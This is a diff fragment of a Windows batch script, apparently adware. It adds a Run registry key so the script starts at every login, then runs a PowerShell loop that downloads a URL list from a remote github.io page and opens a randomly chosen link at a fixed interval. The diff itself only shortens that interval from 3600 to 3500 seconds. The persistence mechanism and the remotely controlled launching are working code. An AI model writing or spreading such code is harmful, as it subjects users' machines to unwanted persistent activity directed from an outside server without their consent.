@@ -3,7 +3,7 @@ set "CARPETA_ADS=%LOCALAPPDATA%\ADS"
 set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"
 set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "REG_NAME=RotadorAdsPS"
-set "PS_LOOP=while ($true) { try { $resp = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing; $urls = $resp.Content -split \"`r?`n\" | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($urls.Count -gt 0) { $elegida = Get-Random -InputObject $urls; Start-Process -FilePath $elegida } } catch {}; Start-Sleep -Seconds 3600 }"
+set "PS_LOOP=while ($true) { try { $resp = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing; $urls = $resp.Content -split \"`r?`n\" | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($urls.Count -gt 0) { $elegida = Get-Random -InputObject $urls; Start-Process -FilePath $elegida } } catch {}; Start-Sleep -Seconds 3500 }"
 
 REM 1. Si rotador_ads.bat ya existe en %LOCALAPPDATA%\ADS, omitir; si no, crear carpeta y copiarlo
 if not exist "%BAT_DESTINO%" (
